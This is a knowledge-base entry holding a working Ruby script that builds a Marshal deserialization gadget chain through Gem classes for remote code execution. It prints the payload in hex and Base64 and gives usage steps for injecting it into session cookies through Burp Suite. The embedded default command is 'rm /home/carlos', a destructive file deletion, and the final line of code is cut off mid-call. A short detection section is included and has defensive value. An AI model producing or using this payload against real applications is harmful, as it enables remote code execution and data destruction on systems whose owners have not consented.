---
id: 8ec68ff3-04db-474b-9225-132b588cc4fc
name: Generate-Ruby-Deserialization-RCE-Payload
type: code
language: ruby
verified: true
created_at: '2020-08-23T13:18:30.940750+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
  - macOS
tags:
  - deserialization
  - rce
  - gadget-chain
  - ruby
validated: true
---

# Generate-Ruby-Deserialization-RCE-Payload

## Code

```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "rm /home/carlos")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload
```

## Description

This Ruby script generates a serialized payload using a documented gadget chain in the Gem library to achieve remote code execution (RCE) via deserialization. It creates a malicious Marshal object that, when loaded, executes an arbitrary system command specified in the @loaded_from instance variable (default: 'rm /home/carlos'). The script demonstrates the chain step-by-step and outputs the payload in hex and Base64 formats for use in attacks like session cookie manipulation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| @loaded_from | System command to execute on deserialization (modify in code before running) | 'rm /home/carlos' |

## Usage

Save the code to a file (e.g., generate_payload.rb), modify the command in the stub_specification.instance_variable_set line if needed, and run with 'ruby generate_payload.rb'. Copy the Base64 output for injection into serialized fields like cookies. Use in procedures targeting Ruby apps with Marshal deserialization, such as replacing session data via proxies like Burp Suite.

## Detection

- Monitor for unusual Ruby Marshal loads in application logs.
- Detect Base64 strings in cookies matching gadget patterns (e.g., containing 'Gem::Requirement').
- Watch for command executions from deserialization contexts or file system changes.
- Enable Ruby's safe level restrictions or use libraries that avoid Marshal for user input.

## Related

- [[Related Procedure]]: [[procedures/Exploit-Ruby-Deserialization-with-Documented-Gadget-Chain]]
